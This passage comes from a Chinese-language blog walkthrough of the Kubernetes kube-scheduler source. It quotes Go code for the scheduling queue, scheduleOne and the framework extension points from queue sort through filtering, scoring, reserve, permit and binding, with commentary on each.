c.MaxSkew, s.TopologyNormalizingWeight[i]) } } return int64(math.Round(score)), nil } 在 Framework 中会运行 ScoreExtension ，即 NormalizeScore\n// Run NormalizeScore method for each ScorePlugin in parallel. f.Parallelizer().Until(ctx, len(f.scorePlugins), func(index int) { pl := f.scorePlugins[index] nodeScoreList := pluginToNodeScores[pl.Name()] if pl.ScoreExtensions() == nil { return } status := f.runScoreExtension(ctx, pl, state, pod, nodeScoreList) if !status.IsSuccess() { err := fmt.Errorf(\u0026quot;plugin %q failed with: %w\u0026quot;, pl.Name(), status.AsError()) errCh.SendErrorWithCancel(err, cancel) return } }) if err := errCh.ReceiveError(); err != nil { return nil, framework.AsStatus(fmt.Errorf(\u0026quot;running Normalize on Score plugins: %w\u0026quot;, err)) } NormalizeScore 会为所有的node根据之前计算出的权重进行打分\nfunc (pl *PodTopologySpread) NormalizeScore(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, scores framework.NodeScoreList) *framework.Status { s, err := getPreScoreState(cycleState) if err != nil { return framework.AsStatus(err) } if s == nil { return nil } // 计算 \u0026lt;minScore\u0026gt; 和 \u0026lt;maxScore\u0026gt; var minScore int64 = math.MaxInt64 var maxScore int64 for i, score := range scores { // it's mandatory to check if \u0026lt;score.Name\u0026gt; is present in m.IgnoredNodes if s.IgnoredNodes.Has(score.Name) { scores[i].Score = invalidScore continue } if score.Score \u0026lt; minScore { minScore = score.Score } if score.Score \u0026gt; maxScore { maxScore = score.Score } } for i := range scores { if scores[i].Score == invalidScore { scores[i].Score = 0 continue } if maxScore == 0 { scores[i].Score = framework.MaxNodeScore continue } s := scores[i].Score scores[i].Score = framework.MaxNodeScore * (maxScore + minScore - s) / maxScore } return nil } 到此，对于pod拓扑插件功能大概可以明了了，\nFilter 部分（PreFilter，Filter）完成拓扑对(Topology Pair)划分 Score部分（PreScore, Score , NormalizeScore ）主要是对拓扑对（可以理解为拓扑结构划分）来选择一个最适合的pod的节点（即分数最优的节点） 而在 scoring_test.go 给了很多用例，可以更深入的了解这部分算法\nReference [1] scheduling code hierarchy\n[2] scheduler algorithm\n[3] in tree VS out of tree volume plugins\n[4] scheduler_framework_plugins\n[5] scheduling config\n[6] topology spread constraints\n","permalink":"https://www.oomkill.com/2022/07/ch21-scheduling-algorithm/","summary":"","title":"如何理解kubernetes调度框架与插件？"},{"content":"Scheduler Scheduler 是整个 kube-scheduler 的一个 structure，提供了 kube-scheduler 运行所需的组件。\ntype Scheduler struct { // Cache是一个抽象，会缓存pod的信息，作为scheduler进行查找，操作是基于Pod进行增加 Cache internalcache.Cache // Extenders 算是调度框架中提供的调度插件，会影响kubernetes中的调度策略 Extenders []framework.Extender // NextPod 作为一个函数提供，会阻塞获取下一个ke'diao'du NextPod func() *framework.QueuedPodInfo // Error is called if there is an error. It is passed the pod in // question, and the error Error func(*framework.QueuedPodInfo, error) // SchedulePod 尝试将给出的pod调度到Node。 SchedulePod func(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) (ScheduleResult, error) // 关闭scheduler的信号 StopEverything \u0026lt;-chan struct{} // SchedulingQueue保存要调度的Pod SchedulingQueue internalqueue.SchedulingQueue // Profiles中是多个调度框架 Profiles profile.Map client clientset.Interface nodeInfoSnapshot *internalcache.Snapshot percentageOfNodesToScore int32 nextStartNodeIndex int } 作为实际执行的两个核心，SchedulingQueue ，与 scheduleOne 将会分析到这两个\nSchedulingQueue 在知道 kube-scheduler 初始化过程后，需要对 kube-scheduler 的整个 structure 和 workflow 进行分析\n在 Run 中，运行的是 一个 SchedulingQueue 与 一个 scheduleOne ，从结构上看是属于 Scheduler\nfunc (sched *Scheduler) Run(ctx context.Context) { sched.SchedulingQueue.Run() // We need to start scheduleOne loop in a dedicated goroutine, // because scheduleOne function hangs on getting the next item // from the SchedulingQueue. // If there are no new pods to schedule, it will be hanging there // and if done in this goroutine it will be blocking closing // SchedulingQueue, in effect causing a deadlock on shutdown. go wait.UntilWithContext(ctx, sched.scheduleOne, 0) \u0026lt;-ctx.Done() sched.SchedulingQueue.Close() } SchedulingQueue 是一个队列的抽象，用于存储等待调度的Pod。该接口遵循类似于 cache.FIFO 和 cache.Heap 的模式。\ntype SchedulingQueue interface { framework.PodNominator Add(pod *v1.Pod) error // Activate moves the given pods to activeQ iff they're in unschedulablePods or backoffQ. // The passed-in pods are originally compiled from plugins that want to activate Pods, // by injecting the pods through a reserved CycleState struct (PodsToActivate). Activate(pods map[string]*v1.Pod) // 将不可调度的Pod重入到队列中 AddUnschedulableIfNotPresent(pod *framework.QueuedPodInfo, podSchedulingCycle int64) error // SchedulingCycle returns the current number of scheduling cycle which is // cached by scheduling queue. Normally, incrementing this number whenever // a pod is popped (e.g. called Pop()) is enough. SchedulingCycle() int64 // Pop会弹出一个pod，并从head优先级队列中删除 Pop() (*framework.QueuedPodInfo, error) Update(oldPod, newPod *v1.Pod) error Delete(pod *v1.Pod) error MoveAllToActiveOrBackoffQueue(event framework.ClusterEvent, preCheck PreEnqueueCheck) AssignedPodAdded(pod *v1.Pod) AssignedPodUpdated(pod *v1.Pod) PendingPods() []*v1.Pod // Close closes the SchedulingQueue so that the goroutine which is // waiting to pop items can exit gracefully. Close() // Run starts the goroutines managing the queue. Run() } 而 PriorityQueue 是 SchedulingQueue 的实现，该部分的核心构成是两个子队列与一个数据结构，即 activeQ、backoffQ 和 unschedulablePods\nactiveQ：是一个 heap 类型的优先级队列，是 sheduler 从中获得优先级最高的Pod进行调度 backoffQ：也是一个 heap 类型的优先级队列，存放的是不可调度的Pod unschedulablePods ：保存确定不可被调度的Pod type SchedulingQueue interface { framework.PodNominator Add(pod *v1.Pod) error // Activate moves the given pods to activeQ iff they're in unschedulablePods or backoffQ. // The passed-in pods are originally compiled from plugins that want to activate Pods, // by injecting the pods through a reserved CycleState struct (PodsToActivate). Activate(pods map[string]*v1.Pod) // AddUnschedulableIfNotPresent adds an unschedulable pod back to scheduling queue. // The podSchedulingCycle represents the current scheduling cycle number which can be // returned by calling SchedulingCycle(). AddUnschedulableIfNotPresent(pod *framework.QueuedPodInfo, podSchedulingCycle int64) error // SchedulingCycle returns the current number of scheduling cycle which is // cached by scheduling queue. Normally, incrementing this number whenever // a pod is popped (e.g. called Pop()) is enough. SchedulingCycle() int64 // Pop removes the head of the queue and returns it. It blocks if the // queue is empty and waits until a new item is added to the queue. Pop() (*framework.QueuedPodInfo, error) Update(oldPod, newPod *v1.Pod) error Delete(pod *v1.Pod) error MoveAllToActiveOrBackoffQueue(event framework.ClusterEvent, preCheck PreEnqueueCheck) AssignedPodAdded(pod *v1.Pod) AssignedPodUpdated(pod *v1.Pod) PendingPods() []*v1.Pod // Close closes the SchedulingQueue so that the goroutine which is // waiting to pop items can exit gracefully. Close() // Run starts the goroutines managing the queue. Run() } 在New scheduler 时可以看到会初始化这个queue\npodQueue := internalqueue.NewSchedulingQueue( // 实现pod对比的一个函数即less profiles[options.profiles[0].SchedulerName].QueueSortFunc(), informerFactory, internalqueue.WithPodInitialBackoffDuration(time.Duration(options.podInitialBackoffSeconds)*time.Second), internalqueue.WithPodMaxBackoffDuration(time.Duration(options.podMaxBackoffSeconds)*time.Second), internalqueue.WithPodNominator(nominator), internalqueue.WithClusterEventMap(clusterEventMap), internalqueue.WithPodMaxInUnschedulablePodsDuration(options.podMaxInUnschedulablePodsDuration), ) 而 NewSchedulingQueue 则是初始化这个 PriorityQueue\n// NewSchedulingQueue initializes a priority queue as a new scheduling queue. func NewSchedulingQueue( lessFn framework.LessFunc, informerFactory informers.SharedInformerFactory, opts ...Option) SchedulingQueue { return NewPriorityQueue(lessFn, informerFactory, opts...) } // NewPriorityQueue creates a PriorityQueue object. func NewPriorityQueue( lessFn framework.LessFunc, informerFactory informers.SharedInformerFactory, opts ...Option, ) *PriorityQueue { options := defaultPriorityQueueOptions for _, opt := range opts { opt(\u0026amp;options) } // 这个就是 less函数，作为打分的一部分 comp := func(podInfo1, podInfo2 interface{}) bool { pInfo1 := podInfo1.(*framework.QueuedPodInfo) pInfo2 := podInfo2.(*framework.QueuedPodInfo) return lessFn(pInfo1, pInfo2) } if options.podNominator == nil { options.podNominator = NewPodNominator(informerFactory.Core().V1().Pods().Lister()) } pq := \u0026amp;PriorityQueue{ PodNominator: options.podNominator, clock: options.clock, stop: make(chan struct{}), podInitialBackoffDuration: options.podInitialBackoffDuration, podMaxBackoffDuration: options.podMaxBackoffDuration, podMaxInUnschedulablePodsDuration: options.podMaxInUnschedulablePodsDuration, activeQ: heap.NewWithRecorder(podInfoKeyFunc, comp, metrics.NewActivePodsRecorder()), unschedulablePods: newUnschedulablePods(metrics.NewUnschedulablePodsRecorder()), moveRequestCycle: -1, clusterEventMap: options.clusterEventMap, } pq.cond.L = \u0026amp;pq.lock pq.podBackoffQ = heap.NewWithRecorder(podInfoKeyFunc, pq.podsCompareBackoffCompleted, metrics.NewBackoffPodsRecorder()) pq.nsLister = informerFactory.Core().V1().Namespaces().Lister() return pq } 了解了Queue的结构，就需要知道 入队列与出队列是在哪里操作的。在初始化时，需要注册一个 addEventHandlerFuncs 这个时候，会注入三个动作函数，也就是controller中的概念；而在AddFunc中可以看到会入队列。\n注入是对 Pod 的informer注入的，注入的函数 addPodToSchedulingQueue 就是入栈\nHandler: cache.ResourceEventHandlerFuncs{ AddFunc: sched.addPodToSchedulingQueue, UpdateFunc: sched.updatePodInSchedulingQueue, DeleteFunc: sched.deletePodFromSchedulingQueue, }, func (sched *Scheduler) addPodToSchedulingQueue(obj interface{}) { pod := obj.(*v1.Pod) klog.V(3).InfoS(\u0026quot;Add event for unscheduled pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) if err := sched.SchedulingQueue.Add(pod); err != nil { utilruntime.HandleError(fmt.Errorf(\u0026quot;unable to queue %T: %v\u0026quot;, obj, err)) } } 而这个 SchedulingQueue 的实现就是 PriorityQueue ，而Add中则对 activeQ进行的操作\nfunc (p *PriorityQueue) Add(pod *v1.Pod) error { p.lock.Lock() defer p.lock.Unlock() // 格式化入栈数据，包含podinfo，里会包含v1.Pod // 初始化的时间，创建的时间，以及不能被调度时的记录其plugin的名称 pInfo := p.newQueuedPodInfo(pod) // 入栈 if err := p.activeQ.Add(pInfo); err != nil { klog.ErrorS(err, \u0026quot;Error adding pod to the active queue\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) return err } if p.unschedulablePods.get(pod) != nil { klog.ErrorS(nil, \u0026quot;Error: pod is already in the unschedulable queue\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) p.unschedulablePods.delete(pod) } // Delete pod from backoffQ if it is backing off if err := p.podBackoffQ.Delete(pInfo); err == nil { klog.ErrorS(nil, \u0026quot;Error: pod is already in the podBackoff queue\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) } metrics.SchedulerQueueIncomingPods.WithLabelValues(\u0026quot;active\u0026quot;, PodAdd).Inc() p.PodNominator.AddNominatedPod(pInfo.PodInfo, nil) p.cond.Broadcast() return nil } 在上面看 scheduler 结构时，可以看到有一个 nextPod的，nextPod就是从队列中弹出一个pod，这个在scheduler 时会传入 MakeNextPodFunc 就是这个 nextpod\nfunc MakeNextPodFunc(queue SchedulingQueue) func() *framework.QueuedPodInfo { return func() *framework.QueuedPodInfo { podInfo, err := queue.Pop() if err == nil { klog.V(4).InfoS(\u0026quot;About to try and schedule pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(podInfo.Pod)) for plugin := range podInfo.UnschedulablePlugins { metrics.UnschedulableReason(plugin, podInfo.Pod.Spec.SchedulerName).Dec() } return podInfo } klog.ErrorS(err, \u0026quot;Error while retrieving next pod from scheduling queue\u0026quot;) return nil } } 而这个 queue.Pop() 对应的就是 PriorityQueue 的 Pop() ，在这里会将作为 activeQ 的消费端\nfunc (p *PriorityQueue) Pop() (*framework.QueuedPodInfo, error) { p.lock.Lock() defer p.lock.Unlock() for p.activeQ.Len() == 0 { // When the queue is empty, invocation of Pop() is blocked until new item is enqueued. // When Close() is called, the p.closed is set and the condition is broadcast, // which causes this loop to continue and return from the Pop(). if p.closed { return nil, fmt.Errorf(queueClosed) } p.cond.Wait() } obj, err := p.activeQ.Pop() if err != nil { return nil, err } pInfo := obj.(*framework.QueuedPodInfo) pInfo.Attempts++ p.schedulingCycle++ return pInfo, nil } 在上面入口部分也看到了，scheduleOne 和 scheduler，scheduleOne 就是去消费一个Pod，他会调用 NextPod，NextPod就是在初始化传入的 MakeNextPodFunc ，至此回到对应的 Pop来做消费。\nschedulerOne是为一个Pod做调度的流程。\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { podInfo := sched.NextPod() // pod could be nil when schedulerQueue is closed if podInfo == nil || podInfo.Pod == nil { return } pod := podInfo.Pod fwk, err := sched.frameworkForPod(pod) if err != nil { // This shouldn't happen, because we only accept for scheduling the pods // which specify a scheduler name that matches one of the profiles. klog.ErrorS(err, \u0026quot;Error occurred\u0026quot;) return } if sched.skipPodSchedule(fwk, pod) { return } ... 调度上下文 当了解了scheduler结构后，下面分析下调度上下文的过程。看看扩展点是怎么工作的。这个时候又需要提到官网的调度上下文的图。\n图1：Pod的调度上下文 Source：https://kubernetes.io/docs/concepts/scheduling-eviction/scheduling-framework 而 scheduler 对于调度上下文来就是这个 scheduleOne ，下面就是看这个调度上下文\nSort Sort 插件提供了排序功能，用于对在调度队列中待处理 Pod 进行排序。一次只能启用一个队列排序。\n在进入 scheduleOne 后，NextPod 从 activeQ 中队列中得到一个Pod，然后的 frameworkForPod 会做打分的动作就是调度上下文的第一个扩展点 sort\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { podInfo := sched.NextPod() // pod could be nil when schedulerQueue is closed if podInfo == nil || podInfo.Pod == nil { return } pod := podInfo.Pod fwk, err := sched.frameworkForPod(pod) ... func (sched *Scheduler) frameworkForPod(pod *v1.Pod) (framework.Framework, error) { // 获取指定的profile fwk, ok := sched.Profiles[pod.Spec.SchedulerName] if !ok { return nil, fmt.Errorf(\u0026quot;profile not found for scheduler name %q\u0026quot;, pod.Spec.SchedulerName) } return fwk, nil } 回顾，因为在New scheduler时会初始化这个 sort 函数\npodQueue := internalqueue.NewSchedulingQueue( profiles[options.profiles[0].SchedulerName].QueueSortFunc(), informerFactory, internalqueue.WithPodInitialBackoffDuration(time.Duration(options.podInitialBackoffSeconds)*time.Second), internalqueue.WithPodMaxBackoffDuration(time.Duration(options.podMaxBackoffSeconds)*time.Second), internalqueue.WithPodNominator(nominator), internalqueue.WithClusterEventMap(clusterEventMap), internalqueue.WithPodMaxInUnschedulablePodsDuration(options.podMaxInUnschedulablePodsDuration), ) preFilter preFilter作为第一个扩展点，是用于在过滤之前预处理或检查 Pod 或集群的相关信息。这里会终止调度\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { podInfo := sched.NextPod() // pod could be nil when schedulerQueue is closed if podInfo == nil || podInfo.Pod == nil { return } pod := podInfo.Pod fwk, err := sched.frameworkForPod(pod) if err != nil { // This shouldn't happen, because we only accept for scheduling the pods // which specify a scheduler name that matches one of the profiles. klog.ErrorS(err, \u0026quot;Error occurred\u0026quot;) return } if sched.skipPodSchedule(fwk, pod) { return } klog.V(3).InfoS(\u0026quot;Attempting to schedule pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) // Synchronously attempt to find a fit for the pod. start := time.Now() state := framework.NewCycleState() state.SetRecordPluginMetrics(rand.Intn(100) \u0026lt; pluginMetricsSamplePercent) // Initialize an empty podsToActivate struct, which will be filled up by plugins or stay empty. podsToActivate := framework.NewPodsToActivate() state.Write(framework.PodsToActivateKey, podsToActivate) schedulingCycleCtx, cancel := context.WithCancel(ctx) defer cancel() // 这里将进入prefilter scheduleResult, err := sched.SchedulePod(schedulingCycleCtx, fwk, state, pod) schedulePod 尝试将给定的 pod 调度到节点列表中的节点之一。如果成功，它将返回节点的名称。\nfunc (sched *Scheduler) schedulePod(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) (result ScheduleResult, err error) { trace := utiltrace.New(\u0026quot;Scheduling\u0026quot;, utiltrace.Field{Key: \u0026quot;namespace\u0026quot;, Value: pod.Namespace}, utiltrace.Field{Key: \u0026quot;name\u0026quot;, Value: pod.Name}) defer trace.LogIfLong(100 * time.Millisecond) // 用于将cache更新为当前内容 if err := sched.Cache.UpdateSnapshot(sched.nodeInfoSnapshot); err != nil { return result, err } trace.Step(\u0026quot;Snapshotting scheduler cache and node infos done\u0026quot;) if sched.nodeInfoSnapshot.NumNodes() == 0 { return result, ErrNoNodesAvailable } // 找到一个合适的pod时，会执行扩展点 feasibleNodes, diagnosis, err := sched.findNodesThatFitPod(ctx, fwk, state, pod) ... findNodesThatFitPod 会执行对应的过滤插件来找到最适合的Node，包括备注，以及方法名都可以看到，这里运行的插件😁😁，后面会分析算法内容，只对workflow学习。\nfunc (sched *Scheduler) findNodesThatFitPod(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) ([]*v1.Node, framework.Diagnosis, error) { diagnosis := framework.Diagnosis{ NodeToStatusMap: make(framework.NodeToStatusMap), UnschedulablePlugins: sets.NewString(), } // Run \u0026quot;prefilter\u0026quot; plugins. preRes, s := fwk.RunPreFilterPlugins(ctx, state, pod) allNodes, err := sched.nodeInfoSnapshot.NodeInfos().List() if err != nil { return nil, diagnosis, err } if !s.IsSuccess() { if !s.IsUnschedulable() { return nil, diagnosis, s.AsError() } // All nodes will have the same status. Some non trivial refactoring is // needed to avoid this copy. for _, n := range allNodes { diagnosis.NodeToStatusMap[n.Node().Name] = s } // Status satisfying IsUnschedulable() gets injected into diagnosis.UnschedulablePlugins. if s.FailedPlugin() != \u0026quot;\u0026quot; { diagnosis.UnschedulablePlugins.Insert(s.FailedPlugin()) } return nil, diagnosis, nil } // \u0026quot;NominatedNodeName\u0026quot; can potentially be set in a previous scheduling cycle as a result of preemption. // This node is likely the only candidate that will fit the pod, and hence we try it first before iterating over all nodes. if len(pod.Status.NominatedNodeName) \u0026gt; 0 { feasibleNodes, err := sched.evaluateNominatedNode(ctx, pod, fwk, state, diagnosis) if err != nil { klog.ErrorS(err, \u0026quot;Evaluation failed on nominated node\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;node\u0026quot;, pod.Status.NominatedNodeName) } // Nominated node passes all the filters, scheduler is good to assign this node to the pod. if len(feasibleNodes) != 0 { return feasibleNodes, diagnosis, nil } } nodes := allNodes if !preRes.AllNodes() { nodes = make([]*framework.NodeInfo, 0, len(preRes.NodeNames)) for n := range preRes.NodeNames { nInfo, err := sched.nodeInfoSnapshot.NodeInfos().Get(n) if err != nil { return nil, diagnosis, err } nodes = append(nodes, nInfo) } } feasibleNodes, err := sched.findNodesThatPassFilters(ctx, fwk, state, pod, diagnosis, nodes) if err != nil { return nil, diagnosis, err } feasibleNodes, err = findNodesThatPassExtenders(sched.Extenders, pod, feasibleNodes, diagnosis.NodeToStatusMap) if err != nil { return nil, diagnosis, err } return feasibleNodes, diagnosis, nil } filter filter插件相当于调度上下文中的 Predicates，用于排除不能运行 Pod 的节点。Filter 会按配置的顺序进行调用。如果有一个filter将节点标记位不可用，则将 Pod 标记为不可调度（即不会向下执行）。\n对于代码中来讲，filter还是处于 findNodesThatFitPod 函数中，findNodesThatPassFilters 就是获取到 FN，即可行节点，而这个过程就是 filter 扩展点\nfunc (sched *Scheduler) findNodesThatFitPod(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) ([]*v1.Node, framework.Diagnosis, error) { ... feasibleNodes, err := sched.findNodesThatPassFilters(ctx, fwk, state, pod, diagnosis, nodes) if err != nil { return nil, diagnosis, err } feasibleNodes, err = findNodesThatPassExtenders(sched.Extenders, pod, feasibleNodes, diagnosis.NodeToStatusMap) if err != nil { return nil, diagnosis, err } return feasibleNodes, diagnosis, nil } Postfilter 当没有为 pod 找到FN时，该插件会按照配置的顺序进行调用。如果任何postFilter插件将 Pod 标记为schedulable，则不会调用其余插件。即 filter 成功后不会进行这步骤，那我们来验证下这里把😊\n还是在 scheduleOne 中，当我们运行的 SchedulePod 完成后（成功或失败），这时会返回一个err，而 postfilter 会根据这个 err进行选择执行或不执行，符合官方给出的说法。\nscheduleResult, err := sched.SchedulePod(schedulingCycleCtx, fwk, state, pod) if err != nil { // SchedulePod() may have failed because the pod would not fit on any host, so we try to // preempt, with the expectation that the next time the pod is tried for scheduling it // will fit due to the preemption. It is also possible that a different pod will schedule // into the resources that were preempted, but this is harmless. var nominatingInfo *framework.NominatingInfo if fitError, ok := err.(*framework.FitError); ok { if !fwk.HasPostFilterPlugins() { klog.V(3).InfoS(\u0026quot;No PostFilter plugins are registered, so no preemption will be performed\u0026quot;) } else { // Run PostFilter plugins to try to make the pod schedulable in a future scheduling cycle. result, status := fwk.RunPostFilterPlugins(ctx, state, pod, fitError.Diagnosis.NodeToStatusMap) if status.Code() == framework.Error { klog.ErrorS(nil, \u0026quot;Status after running PostFilter plugins for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;status\u0026quot;, status) } else { fitError.Diagnosis.PostFilterMsg = status.Message() klog.V(5).InfoS(\u0026quot;Status after running PostFilter plugins for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;status\u0026quot;, status) } if result != nil { nominatingInfo = result.NominatingInfo } } // Pod did not fit anywhere, so it is counted as a failure. If preemption // succeeds, the pod should get counted as a success the next time we try to // schedule it. (hopefully) metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) } else if err == ErrNoNodesAvailable { nominatingInfo = clearNominatedNode // No nodes available is counted as unschedulable rather than an error. metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) } else { nominatingInfo = clearNominatedNode klog.ErrorS(err, \u0026quot;Error selecting node for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod)) metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) } sched.handleSchedulingFailure(ctx, fwk, podInfo, err, v1.PodReasonUnschedulable, nominatingInfo) return } PreScore,Score 可用于进行预Score工作，作为通知性的扩展点，会在在filter完之后直接会关联 preScore 插件进行继续工作，而不是返回，如果配置的这些插件有任何一个返回失败，则Pod将被拒绝。\nfunc (sched *Scheduler) schedulePod(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) (result ScheduleResult, err error) { trace := utiltrace.New(\u0026quot;Scheduling\u0026quot;, utiltrace.Field{Key: \u0026quot;namespace\u0026quot;, Value: pod.Namespace}, utiltrace.Field{Key: \u0026quot;name\u0026quot;, Value: pod.Name}) defer trace.LogIfLong(100 * time.Millisecond) if err := sched.Cache.UpdateSnapshot(sched.nodeInfoSnapshot); err != nil { return result, err } trace.Step(\u0026quot;Snapshotting scheduler cache and node infos done\u0026quot;) if sched.nodeInfoSnapshot.NumNodes() == 0 { return result, ErrNoNodesAvailable } feasibleNodes, diagnosis, err := sched.findNodesThatFitPod(ctx, fwk, state, pod) if err != nil { return result, err } trace.Step(\u0026quot;Computing predicates done\u0026quot;) if len(feasibleNodes) == 0 { return result, \u0026amp;framework.FitError{ Pod: pod, NumAllNodes: sched.nodeInfoSnapshot.NumNodes(), Diagnosis: diagnosis, } } // When only one node after predicate, just use it. if len(feasibleNodes) == 1 { return ScheduleResult{ SuggestedHost: feasibleNodes[0].Name, EvaluatedNodes: 1 + len(diagnosis.NodeToStatusMap), FeasibleNodes: 1, }, nil } // 这里会完成prescore，score priorityList, err := prioritizeNodes(ctx, sched.Extenders, fwk, state, pod, feasibleNodes) if err != nil { return result, err } host, err := selectHost(priorityList) trace.Step(\u0026quot;Prioritizing done\u0026quot;) return ScheduleResult{ SuggestedHost: host, EvaluatedNodes: len(feasibleNodes) + len(diagnosis.NodeToStatusMap), FeasibleNodes: len(feasibleNodes), }, err } priorityNodes 会通过配置的插件给Node打分，并返回每个Node的分数，将每个插件打分结果计算总和获得Node的分数，最后获得节点的加权总分数。\nfunc prioritizeNodes( ctx context.Context, extenders []framework.Extender, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod, nodes []*v1.Node, ) (framework.NodeScoreList, error) { // If no priority configs are provided, then all nodes will have a score of one. // This is required to generate the priority list in the required format if len(extenders) == 0 \u0026amp;\u0026amp; !fwk.HasScorePlugins() { result := make(framework.NodeScoreList, 0, len(nodes)) for i := range nodes { result = append(result, framework.NodeScore{ Name: nodes[i].Name, Score: 1, }) } return result, nil } // Run PreScore plugins. preScoreStatus := fwk.RunPreScorePlugins(ctx, state, pod, nodes) if !preScoreStatus.IsSuccess() { return nil, preScoreStatus.AsError() } // Run the Score plugins. scoresMap, scoreStatus := fwk.RunScorePlugins(ctx, state, pod, nodes) if !scoreStatus.IsSuccess() { return nil, scoreStatus.AsError() } // Additional details logged at level 10 if enabled. klogV := klog.V(10) if klogV.Enabled() { for plugin, nodeScoreList := range scoresMap { for _, nodeScore := range nodeScoreList { klogV.InfoS(\u0026quot;Plugin scored node for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;plugin\u0026quot;, plugin, \u0026quot;node\u0026quot;, nodeScore.Name, \u0026quot;score\u0026quot;, nodeScore.Score) } } } // Summarize all scores. result := make(framework.NodeScoreList, 0, len(nodes)) for i := range nodes { result = append(result, framework.NodeScore{Name: nodes[i].Name, Score: 0}) for j := range scoresMap { result[i].Score += scoresMap[j][i].Score } } if len(extenders) != 0 \u0026amp;\u0026amp; nodes != nil { var mu sync.Mutex var wg sync.WaitGroup combinedScores := make(map[string]int64, len(nodes)) for i := range extenders { if !extenders[i].IsInterested(pod) { continue } wg.Add(1) go func(extIndex int) { metrics.SchedulerGoroutines.WithLabelValues(metrics.PrioritizingExtender).Inc() defer func() { metrics.SchedulerGoroutines.WithLabelValues(metrics.PrioritizingExtender).Dec() wg.Done() }() prioritizedList, weight, err := extenders[extIndex].Prioritize(pod, nodes) if err != nil { // Prioritization errors from extender can be ignored, let k8s/other extenders determine the priorities klog.V(5).InfoS(\u0026quot;Failed to run extender's priority function. No score given by this extender.\u0026quot;, \u0026quot;error\u0026quot;, err, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;extender\u0026quot;, extenders[extIndex].Name()) return } mu.Lock() for i := range *prioritizedList { host, score := (*prioritizedList)[i].Host, (*prioritizedList)[i].Score if klogV.Enabled() { klogV.InfoS(\u0026quot;Extender scored node for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;extender\u0026quot;, extenders[extIndex].Name(), \u0026quot;node\u0026quot;, host, \u0026quot;score\u0026quot;, score) } combinedScores[host] += score * weight } mu.Unlock() }(i) } // wait for all go routines to finish wg.Wait() for i := range result { // MaxExtenderPriority may diverge from the max priority used in the scheduler and defined by MaxNodeScore, // therefore we need to scale the score returned by extenders to the score range used by the scheduler. result[i].Score += combinedScores[result[i].Name] * (framework.MaxNodeScore / extenderv1.MaxExtenderPriority) } } if klogV.Enabled() { for i := range result { klogV.InfoS(\u0026quot;Calculated node's final score for pod\u0026quot;, \u0026quot;pod\u0026quot;, klog.KObj(pod), \u0026quot;node\u0026quot;, result[i].Name, \u0026quot;score\u0026quot;, result[i].Score) } } return result, nil } Reserve Reserve 因为绑定事件时异步发生的，该插件是为了避免Pod在绑定到节点前时，调度到新的Pod，使节点使用资源超过可用资源情况。如果后续阶段发生错误或失败，将触发 UnReserve 回滚（通知性扩展点）。这也是作为调度周期中最后一个状态，要么成功到 postBind ，要么失败触发 UnReserve。\n// Run the Reserve method of reserve plugins. if sts := fwk.RunReservePluginsReserve(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost); !sts.IsSuccess() { // 当处理不成功时 metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) // 触发 un-reserve 来清理相关Pod的状态 fwk.RunReservePluginsUnreserve(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if forgetErr := sched.Cache.ForgetPod(assumedPod); forgetErr != nil { klog.ErrorS(forgetErr, \u0026quot;Scheduler cache ForgetPod failed\u0026quot;) } sched.handleSchedulingFailure(ctx, fwk, assumedPodInfo, sts.AsError(), SchedulerError, clearNominatedNode) return } permit Permit 插件可以阻止或延迟 Pod 的绑定\n// Run \u0026quot;permit\u0026quot; plugins. runPermitStatus := fwk.RunPermitPlugins(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) if !runPermitStatus.IsWait() \u0026amp;\u0026amp; !runPermitStatus.IsSuccess() { var reason string if runPermitStatus.IsUnschedulable() { metrics.PodUnschedulable(fwk.ProfileName(), metrics.SinceInSeconds(start)) reason = v1.PodReasonUnschedulable } else { metrics.PodScheduleError(fwk.ProfileName(), metrics.SinceInSeconds(start)) reason = SchedulerError } // 只要其中一个插件返回的状态不是 success 或者 wait fwk.RunReservePluginsUnreserve(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) // 从cache中忘掉pod if forgetErr := sched.Cache.ForgetPod(assumedPod); forgetErr != nil { klog.ErrorS(forgetErr, \u0026quot;Scheduler cache ForgetPod failed\u0026quot;) } sched.handleSchedulingFailure(ctx, fwk, assumedPodInfo, runPermitStatus.AsError(), reason, clearNominatedNode) return } Binding Cycle 在选择好 FN 后则做一个假设绑定，并更新到cache中，接下来回去执行真正的bind操作，也就是 binding cycle\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { ... ... // binding cycle 是一个异步的操作，这里表现就是go协程 go func() { bindingCycleCtx, cancel := context.WithCancel(ctx) defer cancel() metrics.SchedulerGoroutines.WithLabelValues(metrics.Binding).Inc() defer 